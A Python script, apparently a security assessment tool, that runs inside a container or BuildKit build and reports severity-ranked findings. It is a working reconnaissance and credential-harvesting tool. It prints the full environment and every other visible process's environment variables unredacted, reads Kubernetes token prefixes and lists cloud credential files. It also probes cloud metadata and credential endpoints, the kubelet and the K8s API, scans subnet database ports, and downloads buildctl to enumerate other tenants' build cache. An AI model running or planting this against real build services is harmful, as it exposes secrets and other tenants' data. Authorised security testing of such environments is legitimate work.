import glob
import logging
import os
import re
import socket
import struct
import subprocess
import sys
from collections import Counter
from datetime import datetime, timezone
from pathlib import Path

_report_logger = logging.getLogger("recon_report")
_report_logger.setLevel(logging.INFO)
_report_logger.propagate = False


# ---------------------------------------------------------------------------
# Report infrastructure
# ---------------------------------------------------------------------------

SEP = "=" * 78
findings: list[dict] = []


def heading(title: str) -> None:
    print(f"\n{SEP}")
    print(f"  {title}")
    print(SEP)


def finding(severity: str, category: str, title: str, detail: str) -> None:
    findings.append(
        {"severity": severity, "category": category, "title": title, "detail": detail}
    )
    print(f"\n  [{severity}] {title}")
    print(f"  Category: {category}")
    print(f"  Detail:   {detail}")
    print("  ---")


def read_file(path: str, max_bytes: int = 8192) -> str | None:
    try:
        return Path(path).read_text(errors="replace")[:max_bytes]
    except (OSError, PermissionError):
        return None


def run_cmd(cmd: list[str] | str, timeout: int = 10, shell: bool = False) -> str | None:
    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=timeout,
            shell=shell,
        )
        out = result.stdout.strip()
        return out if out else None
    except (subprocess.TimeoutExpired, FileNotFoundError, OSError):
        return None


def can_reach(host: str, port: int, timeout: float = 3.0) -> bool:
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except (OSError, socket.timeout):
        return False


def resolve_host(hostname: str) -> str | None:
    try:
        return socket.gethostbyname(hostname)
    except socket.gaierror:
        return None


def http_get(url: str, headers: dict | None = None, timeout: float = 3.0) -> tuple[int, str]:
    """Minimal HTTP GET using urllib to avoid external deps."""
    import urllib.request
    import urllib.error

    req = urllib.request.Request(url, headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            body = resp.read(4096).decode("utf-8", errors="replace")
            return resp.status, body
    except urllib.error.HTTPError as e:
        return e.code, ""
    except Exception:
        return 0, ""


def http_put(url: str, headers: dict | None = None, timeout: float = 3.0) -> tuple[int, str]:
    """Minimal HTTP PUT."""
    import urllib.request
    import urllib.error

    req = urllib.request.Request(url, data=b"", headers=headers or {}, method="PUT")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            body = resp.read(4096).decode("utf-8", errors="replace")
            return resp.status, body
    except urllib.error.HTTPError as e:
        return e.code, ""
    except Exception:
        return 0, ""


# ---------------------------------------------------------------------------
# 1. Identity & Context
# ---------------------------------------------------------------------------

def check_identity():
    heading("1. IDENTITY & CONTEXT")

    uid = os.getuid()
    gid = os.getgid()
    user = os.environ.get("USER", run_cmd(["whoami"]) or "unknown")
    groups = run_cmd(["id"]) or "unknown"

    print(f"  User: {user}  UID: {uid}  GID: {gid}")
    print(f"  Groups: {groups}")

    if uid == 0:
        finding("HIGH", "Identity", "Running as root (UID 0)",
                "Build runs as root. Combined with other findings this may enable escapes.")
    else:
        finding("INFO", "Identity", f"Running as UID {uid}", "Non-root, good.")

    # Passwordless sudo
    sudo_check = run_cmd(["sudo", "-n", "-l"], timeout=5)
    if sudo_check and not re.search(r"not allowed|password|sorry", sudo_check, re.I):
        finding("CRITICAL", "Identity", "Passwordless sudo available", sudo_check)


# ---------------------------------------------------------------------------
# 2. Environment Variables
# ---------------------------------------------------------------------------

def check_env():
    heading("2. ENVIRONMENT VARIABLES")

    print("  --- Full environment ---")
    for k in sorted(os.environ):
        print(f"  {k}={os.environ[k]}")
    print()

    sensitive_re = re.compile(
        r"TOKEN|SECRET|KEY|PASSWORD|CREDENTIAL|AUTH|AWS_|GOOGLE_|AZURE_|KUBE|"
        r"API_KEY|PRIVATE|CERT|DATABASE|DB_|REDIS|MONGO|MYSQL|POSTGRES|"
        r"REGISTRY|DOCKER_|BUILDKIT|GIT_TOKEN|NPM_TOKEN|GITHUB_|GITLAB_|CI_|ARTIFACTORY",
        re.I,
    )

    leaked = {k: v for k, v in os.environ.items() if sensitive_re.search(k)}
    if leaked:
        detail = "\n".join(f"    {k}={v}" for k, v in leaked.items())
        finding("HIGH", "Env Leak", "Sensitive-looking env vars found", detail)
    else:
        finding("INFO", "Env Leak", "No obviously sensitive env vars", "Pattern scan clean.")

    bk_vars = {k: v for k, v in os.environ.items() if re.search(r"BUILDKIT|MOBY|DOCKER_BUILDKIT", k, re.I)}
    if bk_vars:
        detail = "\n".join(f"    {k}={v}" for k, v in bk_vars.items())
        finding("MEDIUM", "Env Leak", "BuildKit metadata exposed", detail)


# ---------------------------------------------------------------------------
# 3. Filesystem Reconnaissance
# ---------------------------------------------------------------------------

def check_filesystem():
    heading("3. FILESYSTEM RECONNAISSANCE")

    # 3a. Mounts
    print("  --- Mount points ---")
    mounts = read_file("/proc/mounts")
    if mounts:
        print(mounts)
    else:
        mount_out = run_cmd(["mount"])
        print(mount_out or "  Cannot enumerate mounts")
    print()

    # Container runtime sockets
    for sock_path in [
        "/var/run/docker.sock",
        "/run/docker.sock",
        "/var/run/containerd/containerd.sock",
    ]:
        if os.path.exists(sock_path):
            finding("CRITICAL", "Filesystem", f"Container runtime socket found: {sock_path}",
                    "Can escape to host, spawn privileged containers, access other builds.")

    # BuildKit state directories
    for bk_path in ["/var/lib/buildkit", "/run/buildkit"]:
        if os.path.isdir(bk_path):
            try:
                contents = run_cmd(["ls", "-la", bk_path])
            except Exception:
                contents = "could not list"
            finding("HIGH", "Filesystem", f"BuildKit state directory accessible: {bk_path}",
                    f"May contain layers/cache from other tenant builds.\n{contents}")

    for bk_glob in glob.glob("/tmp/buildkit*"):
        if os.path.isdir(bk_glob):
            finding("HIGH", "Filesystem", f"BuildKit temp directory: {bk_glob}",
                    "Potential cache or scratch data from BuildKit.")

    # Service account token
    sa_path = "/var/run/secrets/kubernetes.io/serviceaccount"
    if os.path.isdir(sa_path):
        token = read_file(f"{sa_path}/token")
        prefix = (token[:40] + "...") if token else "unreadable"
        finding("CRITICAL", "Filesystem", "Kubernetes service account token mounted",
                f"Path: {sa_path}  Token prefix: {prefix}")
    else:
        finding("INFO", "Filesystem", "No K8s service account token at default path", "Good.")

    # Cloud / K8s credential paths
    cloud_paths = [
        "/var/run/secrets/eks.amazonaws.com",
        "/var/run/secrets/google",
        "/etc/kubernetes",
        "/root/.kube",
        "/root/.aws",
        "/root/.config/gcloud",
    ]
    # Also check home dirs
    for home in glob.glob("/home/*"):
        cloud_paths.extend([f"{home}/.kube", f"{home}/.aws", f"{home}/.config/gcloud"])

    for cp in cloud_paths:
        if os.path.exists(cp):
            contents = run_cmd(["ls", "-laR", cp])
            finding("CRITICAL", "Filesystem", f"Cloud/K8s credential path exists: {cp}",
                    (contents or "exists but could not list")[:500])

    # 3b. World-writable directories
    print("\n  --- World-writable directories (outside /tmp, /proc, /sys) ---")
    ww = run_cmd(
        "find / -maxdepth 4 -type d -writable "
        "! -path '/tmp*' ! -path '/proc*' ! -path '/sys*' ! -path '/dev*' "
        "2>/dev/null | head -30",
        shell=True,
        timeout=15,
    )
    if ww:
        print(ww)

    # 3c. SUID/SGID binaries
    print("\n  --- SUID/SGID binaries ---")
    suid = run_cmd(
        r"find / -maxdepth 5 \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null | head -20",
        shell=True,
        timeout=15,
    )
    if suid:
        finding("MEDIUM", "Filesystem", "SUID/SGID binaries found", suid)
        print(suid)
    else:
        print("  None found")

    # 3d. /proc exploration
    print("\n  --- /proc exploration ---")
    cmdline = read_file("/proc/1/cmdline")
    if cmdline:
        print(f"  PID 1 cmdline: {cmdline.replace(chr(0), ' ')}")

    cgroup = read_file("/proc/1/cgroup")
    if cgroup:
        print(f"  PID 1 cgroups: {cgroup.strip()}")

    # Visible PIDs
    try:
        pids = sorted([p for p in os.listdir("/proc") if p.isdigit()], key=int)
        print(f"  Visible PIDs: {len(pids)}")
        print(f"  PID list: {', '.join(pids)}")
        print("\n  --- Process details (ps auxww) ---")
        ps_out = run_cmd(["ps", "auxww"])
        if ps_out:
            print(ps_out)
        else:
            # Fallback: read cmdline for each PID
            for pid in pids:
                cmdline = read_file(f"/proc/{pid}/cmdline")
                cmd_str = cmdline.replace("\x00", " ").strip() if cmdline else "(unreadable)"
                print(f"    PID {pid}: {cmd_str}")
        if len(pids) > 10:
            finding("MEDIUM", "Filesystem", f"Many processes visible ({len(pids)} PIDs)",
                    f"Other build or host processes may be visible.\n{(ps_out or '')[:500]}")
    except OSError:
        pass

    # /proc/self/mountinfo — host path leaks
    print("\n  --- /proc/self/mountinfo (host path leak) ---")
    mountinfo = read_file("/proc/self/mountinfo")
    if mountinfo:
        lines = mountinfo.strip().split("\n")[:30]
        for line in lines:
            print(f"  {line}")
        host_paths = re.findall(r"/var/lib/\S+", mountinfo)
        if host_paths:
            finding("MEDIUM", "Filesystem", "Host paths leaked via mountinfo",
                    "\n".join(host_paths[:10]))


# ---------------------------------------------------------------------------
# 4. Capabilities & Security Profile
# ---------------------------------------------------------------------------

# Map of capability bit positions to names (covers the most security-relevant ones)
CAP_NAMES = {
    0: "CAP_CHOWN", 1: "CAP_DAC_OVERRIDE", 2: "CAP_DAC_READ_SEARCH",
    3: "CAP_FOWNER", 5: "CAP_KILL", 6: "CAP_SETGID", 7: "CAP_SETUID",
    8: "CAP_SETPCAP", 10: "CAP_NET_BIND_SERVICE", 12: "CAP_NET_ADMIN",
    13: "CAP_NET_RAW", 14: "CAP_IPC_LOCK", 16: "CAP_SYS_MODULE",
    17: "CAP_SYS_RAWIO", 18: "CAP_SYS_CHROOT", 19: "CAP_SYS_PTRACE",
    21: "CAP_SYS_ADMIN", 22: "CAP_SYS_BOOT", 23: "CAP_SYS_NICE",
    25: "CAP_SYS_TIME", 29: "CAP_AUDIT_WRITE", 37: "CAP_BPF",
    38: "CAP_PERFMON", 39: "CAP_CHECKPOINT_RESTORE",
}

DANGEROUS_CAPS = {
    "CAP_SYS_ADMIN", "CAP_SYS_PTRACE", "CAP_NET_ADMIN", "CAP_NET_RAW",
    "CAP_SYS_MODULE", "CAP_SYS_RAWIO", "CAP_DAC_OVERRIDE", "CAP_SYS_BOOT",
    "CAP_BPF", "CAP_PERFMON", "CAP_DAC_READ_SEARCH",
}


def decode_caps(hex_str: str) -> list[str]:
    """Decode a hex capability bitmask into capability names."""
    value = int(hex_str, 16)
    active = []
    for bit, name in sorted(CAP_NAMES.items()):
        if (value >> bit) & 1:
            active.append(name)
    return active


def check_capabilities():
    heading("4. CAPABILITIES & SECURITY PROFILE")

    status = read_file("/proc/self/status")
    if status:
        print("  --- /proc/self/status capability lines ---")
        for line in status.split("\n"):
            if line.lower().startswith("cap"):
                print(f"  {line}")

    # Decode CapEff
    cap_eff_match = re.search(r"CapEff:\s*([0-9a-fA-F]+)", status or "")
    if cap_eff_match:
        cap_hex = cap_eff_match.group(1)
        active_caps = decode_caps(cap_hex)
        dangerous = [c for c in active_caps if c in DANGEROUS_CAPS]

        print(f"\n  --- Decoded effective capabilities (CapEff={cap_hex}) ---")
        for c in active_caps:
            marker = " [DANGEROUS]" if c in DANGEROUS_CAPS else ""
            print(f"    {c}{marker}")

        if dangerous:
            finding("HIGH", "Capabilities", f"Dangerous capabilities active: {', '.join(dangerous)}",
                    f"CapEff={cap_hex}. These can enable escape or cross-tenant attacks.")
        else:
            finding("INFO", "Capabilities", f"CapEff={cap_hex}", "No obviously dangerous caps detected.")

    # capsh
    capsh = run_cmd(["capsh", "--print"])
    if capsh:
        print(f"\n  --- capsh --print ---\n{capsh}")

    # Seccomp
    seccomp_match = re.search(r"Seccomp:\s*(\d)", status or "")
    if seccomp_match:
        mode = seccomp_match.group(1)
        labels = {"0": "DISABLED", "1": "strict mode", "2": "filter mode (BPF)"}
        label = labels.get(mode, f"unknown ({mode})")
        severity = "MEDIUM" if mode == "0" else "INFO"
        finding(severity, "Seccomp", f"Seccomp {label}",
                "No syscall filtering in place." if mode == "0" else "Filtering active.")

    # LSM
    print("\n  --- LSM profile ---")
    lsm = read_file("/proc/self/attr/current")
    print(f"  {lsm.strip() if lsm else 'No LSM profile readable'}")
    se = run_cmd(["getenforce"])
    print(f"  SELinux: {se or 'not available'}")


# ---------------------------------------------------------------------------
# 5. Namespace & Cgroup Isolation
# ---------------------------------------------------------------------------

def check_namespaces():
    heading("5. NAMESPACE & CGROUP ISOLATION")

    print("  --- Namespace IDs ---")
    ns_out = run_cmd(["ls", "-la", "/proc/self/ns/"])
    if ns_out:
        print(ns_out)

    cmdline = read_file("/proc/1/cmdline")
    if cmdline:
        print(f"\n  PID 1 cmdline: {cmdline.replace(chr(0), ' ')}")
    print(f"  Hostname: {socket.gethostname()}")

    # User namespace check
    uid_map = read_file("/proc/self/uid_map")
    if uid_map:
        print(f"\n  uid_map: {uid_map.strip()}")
        if re.search(r"0\s+0\s+4294967295", uid_map):
            finding("MEDIUM", "Namespace", "Running in init user namespace",
                    "Not rootless BuildKit. UID 0 maps directly to host UID 0.")

    # Cgroup hierarchy
    print("\n  --- Cgroup hierarchy ---")
    cg = read_file("/proc/self/cgroup")
    if cg:
        print(cg)

    # Sibling cgroup enumeration
    for cg_root in ["/sys/fs/cgroup/cpu", "/sys/fs/cgroup/memory", "/sys/fs/cgroup"]:
        if os.path.isdir(cg_root) and os.access(cg_root, os.R_OK):
            siblings = run_cmd(
                f"find {cg_root} -maxdepth 3 -type d 2>/dev/null | "
                f"grep -v '^{cg_root}$' | head -20",
                shell=True,
                timeout=10,
            )
            if siblings:
                finding("MEDIUM", "Namespace", "Can enumerate sibling cgroups",
                        f"May reveal other concurrent builds.\n{siblings[:500]}")
            break


# ---------------------------------------------------------------------------
# 6. Network Reconnaissance
# ---------------------------------------------------------------------------

def get_default_gateway() -> str | None:
    """Parse /proc/net/route for the default gateway."""
    route_data = read_file("/proc/net/route")
    if route_data:
        for line in route_data.strip().split("\n")[1:]:
            fields = line.split()
            if len(fields) >= 3 and fields[1] == "00000000":
                gw_hex = fields[2]
                gw_bytes = struct.pack("<I", int(gw_hex, 16))
                return socket.inet_ntoa(gw_bytes)
    # Fallback to `ip route`
    ip_out = run_cmd(["ip", "route"])
    if ip_out:
        m = re.search(r"default via (\S+)", ip_out)
        if m:
            return m.group(1)
    return None


def check_network():
    heading("6. NETWORK RECONNAISSANCE")

    # Interfaces
    print("  --- Network interfaces ---")
    ifaces = run_cmd(["ip", "addr"]) or run_cmd(["ifconfig"]) or "Cannot enumerate interfaces"
    print(ifaces)

    # Routes
    print("\n  --- Routing table ---")
    routes = run_cmd(["ip", "route"]) or run_cmd(["route", "-n"]) or "Cannot read routes"
    print(routes)

    # DNS
    print("\n  --- DNS config ---")
    resolv = read_file("/etc/resolv.conf")
    print(resolv or "  Cannot read resolv.conf")

    # ARP
    print("\n  --- ARP table ---")
    arp = run_cmd(["ip", "neigh"]) or run_cmd(["arp", "-an"]) or "Cannot read ARP"
    print(arp)

    # 6a. DNS-based discovery
    print("\n  --- DNS discovery ---")
    dns_targets = [
        "kubernetes", "kubernetes.default", "kubernetes.default.svc",
        "kube-dns.kube-system.svc.cluster.local",
        "metadata", "metadata.google.internal",
        "buildkit", "buildkitd", "registry", "docker",
    ]
    for svc in dns_targets:
        resolved = resolve_host(svc)
        if resolved:
            finding("MEDIUM", "Network", f"DNS resolves: {svc}", f"{svc} -> {resolved}")

    # SRV records
    for srv in ["_https._tcp.kubernetes.default.svc", "_http._tcp.kubernetes.default.svc"]:
        srv_result = run_cmd(["dig", "SRV", srv, "+short"], timeout=5)
        if srv_result:
            print(f"  SRV {srv} -> {srv_result}")

    # 6b. Cloud IMDS probing
    print("\n  --- Cloud metadata probing ---")
    imds_targets = [
        ("AWS IMDSv1",  "http://169.254.169.254/latest/meta-data/", {}),
        ("GCP",         "http://169.254.169.254/computeMetadata/v1/", {"Metadata-Flavor": "Google"}),
        ("Azure",       "http://169.254.169.254/metadata/instance?api-version=2021-02-01", {"Metadata": "true"}),
        ("Alibaba",     "http://100.100.100.200/latest/meta-data/", {}),
        ("ECS Task",    "http://169.254.170.2/v2/credentials", {}),
    ]

    for label, url, headers in imds_targets:
        status, body = http_get(url, headers=headers, timeout=3)
        if status == 200:
            finding("CRITICAL", "Network", f"Cloud metadata accessible: {label} (HTTP {status})",
                    f"URL: {url}\nSample: {body[:300]}")

    # AWS IMDSv2
    token_status, token = http_put(
        "http://169.254.169.254/latest/api/token",
        headers={"X-aws-ec2-metadata-token-ttl-seconds": "60"},
        timeout=3,
    )
    if token_status == 200 and token:
        v2_status, v2_body = http_get(
            "http://169.254.169.254/latest/meta-data/",
            headers={"X-aws-ec2-metadata-token": token},
            timeout=3,
        )
        if v2_status == 200:
            finding("CRITICAL", "Network", "AWS IMDSv2 reachable",
                    f"Token obtained. Metadata: {v2_body[:300]}")

    # 6c. Kubelet API
    print("\n  --- Kubelet API probing ---")
    gateway = get_default_gateway()
    if gateway:
        print(f"  Default gateway: {gateway}")
        for port in [10250, 10255, 10248]:
            if can_reach(gateway, port):
                # Try to hit /pods
                status, body = http_get(f"https://{gateway}:{port}/pods", timeout=3)
                finding("CRITICAL", "Network", f"Kubelet port {port} reachable on gateway {gateway}",
                        f"HTTP {status}. Response sample: {body[:300]}")

    # K8s API server
    k8s_ip = resolve_host("kubernetes.default")
    if k8s_ip:
        for port in [443, 6443, 8443]:
            if can_reach(k8s_ip, port):
                status, body = http_get(f"https://{k8s_ip}:{port}/version", timeout=3)
                finding("HIGH", "Network", f"K8s API server reachable at {k8s_ip}:{port}",
                        f"HTTP {status}. Response: {body[:300]}")

    # 6d. Local subnet service scan
    print("\n  --- Local subnet service scan ---")
    if gateway:
        subnet_prefix = ".".join(gateway.split(".")[:3]) + "."
        scan_ports = [2379, 2380, 5432, 3306, 6379, 8080, 8443, 9090, 9093, 9200, 27017, 4194]
        scan_offsets = [1, 2, 3, 10, 100]
        for port in scan_ports:
            for offset in scan_offsets:
                target = f"{subnet_prefix}{offset}"
                if can_reach(target, port):
                    finding("HIGH", "Network", f"Service reachable: {target}:{port}",
                            f"Port {port} often = etcd/postgres/mysql/redis/prometheus/elasticsearch")


# ---------------------------------------------------------------------------
# 7. Kernel & Host Information
# ---------------------------------------------------------------------------

def check_kernel():
    heading("7. KERNEL & HOST INFORMATION")

    uname = run_cmd(["uname", "-a"]) or "unknown"
    kver = run_cmd(["uname", "-r"]) or "unknown"
    print(f"  Kernel: {uname}")
    print(f"  Kernel version: {kver}")

    finding("LOW", "Kernel", f"Kernel version: {kver}",
            "Check for known container escape CVEs "
            "(e.g., CVE-2022-0185, CVE-2022-0847 Dirty Pipe, CVE-2024-1086, CVE-2024-21626).")

    print("\n  --- /etc/os-release ---")
    os_release = read_file("/etc/os-release")
    print(os_release or "  Not available")

    core_pattern = read_file("/proc/sys/kernel/core_pattern")
    if core_pattern:
        print(f"\n  Core pattern: {core_pattern.strip()}")

    print("\n  --- Loaded kernel modules (first 20) ---")
    modules = read_file("/proc/modules")
    if modules:
        for line in modules.strip().split("\n")[:20]:
            print(f"  {line}")
    else:
        print("  Cannot read modules")


# ---------------------------------------------------------------------------
# 8. Persistence & Cross-Tenant Attack Vectors
# ---------------------------------------------------------------------------

def check_persistence():
    heading("8. PERSISTENCE & CROSS-TENANT ATTACK VECTORS")

    print("  Checking for persistence and cross-build contamination vectors...")

    # 8a. BuildKit cache/layer store
    cache_paths = [
        "/var/lib/buildkit/runc-overlayfs",
        "/var/lib/buildkit/containerd",
        "/var/lib/buildkit",
        "/var/lib/docker/overlay2",
        "/var/lib/containerd",
    ]
    for cp in cache_paths:
        if os.path.isdir(cp):
            dir_count = run_cmd(f"find {cp} -maxdepth 3 -type d 2>/dev/null | wc -l",
                                shell=True, timeout=10)
            finding("CRITICAL", "Persistence",
                    f"Build layer storage accessible: {cp} ({dir_count or '?'} dirs)",
                    "If writable, can poison layers that end up in other tenant images.")

    # 8b. Shared temp dirs
    print("\n  --- Checking shared temp dirs for cross-build leakage ---")
    for tmp in ["/tmp", "/var/tmp", "/dev/shm"]:
        if os.path.isdir(tmp):
            try:
                items = os.listdir(tmp)
                if items:
                    listing = run_cmd(["ls", "-la", tmp])
                    finding("MEDIUM", "Persistence",
                            f"Pre-existing files in {tmp} ({len(items)} items)",
                            f"Could be artifacts from prior builds (cross-tenant leak).\n{(listing or '')[:400]}")
            except OSError:
                pass

    # 8c. /dev/shm writable
    if os.path.isdir("/dev/shm") and os.access("/dev/shm", os.W_OK):
        finding("MEDIUM", "Persistence", "/dev/shm is writable",
                "If shared across builds, can be used for cross-build data exfil or signaling.")

    # 8d. Writable system paths (supply chain poisoning)
    poison_globs = [
        "/usr/local/lib/python*/dist-packages",
        "/usr/lib/python*/dist-packages",
        "/usr/local/lib/node_modules",
        "/usr/share/ca-certificates",
        "/etc/ssl/certs",
        "/usr/local/bin",
    ]
    for pattern in poison_globs:
        for p in glob.glob(pattern):
            if os.path.isdir(p) and os.access(p, os.W_OK):
                finding("HIGH", "Persistence", f"Writable system path: {p}",
                        "A malicious RUN step could plant a backdoored library or CA cert "
                        "that persists in the image layer and affects downstream builds.")

    # 8e. Outbound connectivity
    print("\n  --- Outbound connectivity test ---")
    for host, port in [("1.1.1.1", 53), ("8.8.8.8", 53), ("1.1.1.1", 443)]:
        if can_reach(host, port):
            finding("LOW", "Network", f"Outbound to {host}:{port} allowed",
                    "Egress possible. A malicious build can exfiltrate data or download payloads.")

    # 8f. Git config / credential helpers
    git_config = run_cmd(["git", "config", "--list", "--global"])
    git_sys = run_cmd(["git", "config", "--list", "--system"])
    combined = "\n".join(filter(None, [git_config, git_sys]))
    if combined:
        finding("MEDIUM", "Persistence", "Git config present", combined)

    git_cred = run_cmd(["git", "config", "--get", "credential.helper"])
    if git_cred:
        finding("HIGH", "Persistence", f"Git credential helper configured: {git_cred}",
                "May contain or cache tokens for repository access.")

    # 8g. Writable BuildKit/Docker config
    for fe_path in ["/etc/buildkit", "/etc/docker"]:
        if os.path.isdir(fe_path) and os.access(fe_path, os.W_OK):
            finding("CRITICAL", "Persistence", f"Writable BuildKit/Docker config: {fe_path}",
                    "Could inject custom frontend or daemon config affecting all future builds.")


# ---------------------------------------------------------------------------
# 9. BuildKit-Specific Checks
# ---------------------------------------------------------------------------

def _find_buildkitd_sockets() -> list[str]:
    """Scan /proc for buildkitd processes and extract --addr socket paths."""
    sockets = []
    try:
        for pid_entry in os.listdir("/proc"):
            if not pid_entry.isdigit():
                continue
            cmdline = read_file(f"/proc/{pid_entry}/cmdline")
            if not cmdline or "buildkitd" not in cmdline:
                continue
            # cmdline is null-separated
            args = cmdline.split("\x00")
            for i, arg in enumerate(args):
                if arg == "--addr" and i + 1 < len(args):
                    sockets.append(args[i + 1])
                elif arg.startswith("--addr="):
                    sockets.append(arg.split("=", 1)[1])
    except OSError:
        pass
    return sockets


def _download_buildctl() -> str | None:
    """Download a static buildctl binary from GitHub and return its path."""
    import urllib.request
    import platform
    import tarfile
    import io

    arch = platform.machine()
    arch_map = {"x86_64": "amd64", "aarch64": "arm64", "arm64": "arm64"}
    go_arch = arch_map.get(arch)
    if not go_arch:
        print(f"  Unsupported architecture for buildctl download: {arch}")
        return None

    version = "v0.21.1"
    url = (
        f"https://github.com/moby/buildkit/releases/download/{version}/"
        f"buildkit-{version}.linux-{go_arch}.tar.gz"
    )
    dest = "/tmp/buildctl"

    if os.path.isfile(dest) and os.access(dest, os.X_OK):
        print(f"  buildctl already present at {dest}")
        return dest

    print(f"  Downloading buildctl {version} for {go_arch} ...")
    try:
        req = urllib.request.Request(url)
        with urllib.request.urlopen(req, timeout=30) as resp:
            tarball = io.BytesIO(resp.read())
        with tarfile.open(fileobj=tarball, mode="r:gz") as tf:
            for member in tf.getmembers():
                if member.name.endswith("/buildctl") or member.name == "bin/buildctl":
                    member.name = "buildctl"
                    tf.extract(member, path="/tmp")
                    os.chmod(dest, 0o755)
                    print(f"  buildctl extracted to {dest}")
                    return dest
        print("  Could not find buildctl in tarball")
        return None
    except Exception as e:
        print(f"  Failed to download buildctl: {e}")
        return None


def _run_buildctl(buildctl: str, addr: str, args: list[str], timeout: int = 10) -> str | None:
    """Run a buildctl command against a given address."""
    cmd = [buildctl, "--addr", addr] + args
    return run_cmd(cmd, timeout=timeout)


def check_buildkit():
    heading("9. BUILDKIT-SPECIFIC CHECKS")

    for binary in ["buildctl", "buildkitd"]:
        bin_path = run_cmd(["which", binary])
        if bin_path:
            version = run_cmd([bin_path, "--version"]) or "unknown"
            finding("MEDIUM", "BuildKit", f"{binary} found at {bin_path}",
                    f"Version: {version}")

    # Static socket paths
    known_socks = ["/run/buildkit/buildkitd.sock", "/var/run/buildkit/buildkitd.sock"]
    for sock in known_socks:
        if os.path.exists(sock):
            finding("CRITICAL", "BuildKit", f"BuildKit daemon socket accessible: {sock}",
                    "Can use buildctl to list/inspect other builds, access cache, manipulate outputs.")

    pid1_cmd = read_file("/proc/1/cmdline")
    if pid1_cmd and re.search(r"buildkit|runc|executor", pid1_cmd, re.I):
        finding("INFO", "BuildKit", "PID 1 suggests BuildKit executor",
                pid1_cmd.replace("\x00", " "))

    # Discover sockets from running buildkitd processes
    print("\n  --- Scanning processes for buildkitd sockets ---")
    discovered_addrs = _find_buildkitd_sockets()
    if discovered_addrs:
        print(f"  Found buildkitd --addr values: {discovered_addrs}")
        for addr in discovered_addrs:
            finding("HIGH", "BuildKit", f"BuildKit daemon addr from process scan: {addr}",
                    "Discovered by reading /proc/*/cmdline of buildkitd process.")
    else:
        print("  No buildkitd processes found with --addr flags")

    # Build list of unix socket addresses to try
    target_addrs = []
    for addr in discovered_addrs:
        if addr.startswith("unix://"):
            sock_path = addr.replace("unix://", "")
            if os.path.exists(sock_path):
                target_addrs.append(addr)
    # Also add known sockets as unix:// addresses
    for sock in known_socks:
        if os.path.exists(sock):
            addr = f"unix://{sock}"
            if addr not in target_addrs:
                target_addrs.append(addr)
    # Add user-level sockets
    for user_sock in glob.glob("/run/user/*/buildkit/buildkitd.sock"):
        addr = f"unix://{user_sock}"
        if addr not in target_addrs:
            target_addrs.append(addr)

    if not target_addrs:
        print("  No reachable BuildKit sockets found, skipping buildctl probe.")
        return

    # Get buildctl binary
    buildctl = run_cmd(["which", "buildctl"])
    if not buildctl:
        buildctl = _download_buildctl()
    if not buildctl:
        print("  Could not obtain buildctl binary, skipping probe.")
        return

    # Probe each socket
    for addr in target_addrs:
        print(f"\n  --- Probing BuildKit at {addr} ---")

        # Debug info
        debug_info = _run_buildctl(buildctl, addr, ["debug", "info"], timeout=10)
        if debug_info:
            finding("CRITICAL", "BuildKit", f"buildctl debug info succeeded on {addr}",
                    f"Full access to BuildKit daemon.\n{debug_info[:800]}")
        else:
            finding("INFO", "BuildKit", f"buildctl debug info failed on {addr}",
                    "Could not connect or access denied. Daemon may require auth or socket is unreachable.")
            continue  # If basic info fails, skip further probes

        # List workers
        workers = _run_buildctl(buildctl, addr, ["debug", "workers", "-v"], timeout=10)
        if workers:
            finding("CRITICAL", "BuildKit", f"buildctl workers enumerated on {addr}",
                    f"Can see build workers and their config.\n{workers[:800]}")
        else:
            finding("INFO", "BuildKit", f"buildctl debug workers failed on {addr}",
                    "Could not list workers. Command timed out or was denied.")

        # List active build sessions / du
        du_out = _run_buildctl(buildctl, addr, ["du", "-v"], timeout=15)
        if du_out:
            finding("CRITICAL", "BuildKit", f"buildctl du succeeded on {addr}",
                    f"Can enumerate cached build layers (cross-tenant data).\n{du_out[:800]}")
        else:
            finding("INFO", "BuildKit", f"buildctl du failed on {addr}",
                    "Could not enumerate build cache. Command timed out or was denied.")


# ---------------------------------------------------------------------------
# 9b. Process Environment Variable Harvesting
# ---------------------------------------------------------------------------

SENSITIVE_ENV_RE = re.compile(
    r"TOKEN|SECRET|KEY|PASSWORD|CREDENTIAL|AUTH|AWS_|GOOGLE_|AZURE_|KUBE|"
    r"API_KEY|PRIVATE|CERT|DATABASE|DB_|REDIS|MONGO|MYSQL|POSTGRES|"
    r"REGISTRY|DOCKER_|GIT_TOKEN|NPM_TOKEN|GITHUB_|GITLAB_|CI_|ARTIFACTORY",
    re.I,
)


def check_proc_environ():
    """Read /proc/<pid>/environ for every visible PID and report env vars."""
    heading("9b. PROCESS ENVIRONMENT HARVESTING")

    my_pid = str(os.getpid())
    readable_count = 0
    unreadable_count = 0
    all_sensitive: dict[str, list[str]] = {}  # var=val -> list of PIDs

    try:
        pids = sorted(
            [p for p in os.listdir("/proc") if p.isdigit()],
            key=int,
        )
    except OSError:
        print("  Cannot list /proc")
        return

    for pid in pids:
        if pid == my_pid:
            continue
        env_path = f"/proc/{pid}/environ"
        env_data = read_file(env_path)
        if env_data is None:
            unreadable_count += 1
            continue

        readable_count += 1
        # Parse null-separated env vars
        env_vars = [e for e in env_data.split("\x00") if "=" in e]

        # Get process command for context
        cmdline = read_file(f"/proc/{pid}/cmdline")
        cmd_str = cmdline.replace("\x00", " ").strip()[:120] if cmdline else "(unknown)"

        print(f"\n  --- PID {pid}: {cmd_str} ---")
        print(f"  Environment variables ({len(env_vars)} total):")
        for var in env_vars:
            print(f"    {var}")
            # Track sensitive vars
            var_name = var.split("=", 1)[0]
            if SENSITIVE_ENV_RE.search(var_name):
                all_sensitive.setdefault(var, []).append(pid)

    print(f"\n  --- Summary ---")
    print(f"  Readable: {readable_count}  Unreadable: {unreadable_count}  Total: {len(pids) - 1} (excl self)")

    if readable_count > 0:
        finding("HIGH", "Filesystem",
                f"Can read /proc/<pid>/environ for {readable_count} processes",
                f"Cross-process environment variable leak across {readable_count} PIDs.")

    if all_sensitive:
        detail_lines = []
        for var, pid_list in list(all_sensitive.items())[:30]:
            detail_lines.append(f"  PIDs {','.join(pid_list)}: {var}")
        finding("CRITICAL", "Filesystem",
                f"Sensitive env vars leaked from {len(all_sensitive)} vars across other processes",
                "\n".join(detail_lines))
    elif readable_count > 0:
        finding("INFO", "Filesystem",
                "No obviously sensitive env vars found in other processes",
                "Pattern scan clean, but full env dump is above.")


